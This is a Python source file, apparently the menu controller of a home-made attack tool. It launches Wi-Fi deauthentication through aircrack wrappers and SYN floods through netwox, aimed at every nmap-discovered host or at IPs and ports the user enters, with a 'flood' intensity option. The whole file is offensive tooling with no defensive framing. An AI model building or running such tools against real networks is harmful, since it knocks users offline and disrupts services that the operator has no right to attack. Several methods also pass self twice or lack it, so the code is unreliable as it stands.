
from Classes.constants import constants
from Classes.netwox import Netwox
from Classes.nmap import Nmap
from Classes.aircrack import aircrack
from Classes.nmap import nmap_object
from Classes.selfConfig import config
import os
import glob
import re

class ManualController:

    syn_flood_targets = []

    def remove_files_in_directory(self):
        files = glob.glob('%s/a/*' % config.get_airodump_directory())
        for f in files:
            os.remove(f)

    def switch_user_command(string):
        key = int(string)
        return constants.userCommandDict[key]()

    def run(self):
        switch = input("Enter command\n 1-deauth\n 2-synFlood\n")
        if switch == "1":
            self.remove_files_in_directory(self)
            aircrack.monitor_mode()
            aircrack.airodump_call()
            aircrack.aireplay_attack()
        elif switch == "2":
            aircrack.managed_mode()
            self.choose_mode(self)
        else:
            print("wrong format")

    def choose_mode(self):
        #Nmap.test_nmap()
        nmap_arr = Nmap.define_open_ports()
        while True:
            mode = input("Choose attack options \n1: all host attack \n2: manual input host \n")
            if mode == '1':
                self.syn_flood_on_all_hosts(self, nmap_arr)
                break
            if mode == '2':
                self.select_network(self)
                break
            else:
                print("wrong format")
                continue


    def syn_flood_on_all_hosts(self, nmap_arr):
        netwox = Netwox()
        for nmap_o in nmap_arr:
#            netwox.syn_flood_attack(nmap_o, intencity)
            netwox.syn_flood_network(nmap_o)

    def syn_flood_on_select_host(self, intencity: int, nmap_arr):
        netwox = Netwox()
        for nmap_o in nmap_arr:
            netwox.syn_flood_attack(nmap_o, intencity)

    #Get nmap_object_arr

    def select_network(self):
        network_arr = []
        while True:
            network_name = input("Enter IP or 'exit' \n")
            rex = re.compile( "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
            if rex.match(network_name) or network_name == "exit":
                if network_name != "exit":
                    nmap_o = nmap_object(network_name)
                    nmap_o.ports = self.select_port(self)
                    network_arr.append(nmap_o)
                else:
                    print(network_arr)
                    intencity = int(input("Enter intencity number (fast: 1, faster:2, flood:3)\n"))
                    self.syn_flood_on_select_host(self, intencity, network_arr)
            else:
                print("wrong format")
                continue

    def select_port(self):
        port_number_arr = []
        while True:
            port_number = input("Enter port or 'exit' \n")
            rex = re.compile("^[0-9]+$")
            if rex.match(port_number) or port_number == "exit":
                if port_number != "exit":
                    port_number_arr.append(int(port_number))
                else:
                    return port_number_arr
            else:
                print("wrong format")
                continue